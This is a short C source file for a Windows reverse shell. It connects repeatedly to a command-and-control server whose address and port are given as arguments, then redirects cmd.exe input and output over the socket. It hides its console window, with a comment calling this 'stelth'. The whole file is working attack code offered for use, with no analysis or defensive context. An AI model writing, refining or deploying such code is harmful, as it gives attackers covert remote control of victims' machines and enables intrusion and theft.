#include <winsock2.h> // For TCP/IP communication
#include <windows.h> // For calling other procs & calls, and  initiating other headers
#include <ws2tcpip.h> // For TCP/IP communication

// statically compile this library into executable.
// leaving it to link dynamically would require the target to have
// MS Visual C/C++ installed, which isn't a guarantee
#pragma comment(lib, "Ws2_32.lib")

// default buffer size for send and recieve over TCP
#define DEFAULT_BUFLEN 1024

void RunShell(char* C2Server, int C2Port) {
	while(true) {
		Sleep(5000);
		
		SOCKET mySocket;
		sockaddr_in addr;
		WSADATA version;

		WSAStartup(MAKEWORD(2,2), &version);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

		addr.sin_family = AF_INET; // Set to IPv4
		addr.sin_addr.s_addr = inet_addr(C2Server); // Set to C2 IP
		addr.sin_port = htons(C2Port); // Set to C2 Port

		// Connect to C2
		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			closesocket(mySocket);
			WSACleanup();
			continue;
		} else {
			char RecvData[DEFAULT_BUFLEN]; // Create & Set recieve buffer to default size
			memset(RecvData, 0, sizeof(RecvData)); // allocate memory of RecvData to 0s of default size
			int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);

			if (RecvCode <= 0) {
				closesocket(mySocket);
				WSACleanup();
				continue;
			} else {
				char Process[] = "cmd.exe";
				STARTUPINFO sinfo;
				PROCESS_INFORMATION pinfo;

				memset(&sinfo, 0, sizeof(sinfo));

				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;

				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);

				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);

				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);

				if (RecvCode <= 0) {
					closesocket(mySocket);
					WSACleanup();
					continue;
				}

				if (strcmp(RecvData, "exit\n") == 0) {
					exit(0);
				}
			}

		}

	}

}

int main(int argc, char **argv) {
	FreeConsole(); // stops a terminal from popping up, stelth

	if (argc == 3) {
		//char host[] = argv[1];
		int port = atoi(argv[2]);
		RunShell(argv[1],port);
	}

	return 0;
}
